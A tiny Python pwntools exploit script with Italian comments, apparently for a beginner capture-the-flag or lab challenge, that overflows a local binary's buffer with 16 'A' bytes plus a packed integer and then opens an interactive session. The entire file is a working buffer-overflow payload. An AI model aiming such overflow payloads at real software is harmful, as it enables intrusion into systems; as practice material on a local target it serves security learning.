from pwn import *

p = process("./main")

#Devo dare 16 volte un carattere, in byte
payload = b"A" * 16
payload += p32(1)

p.sendline(payload)

#Rende il programma come un terminale
p.interactive()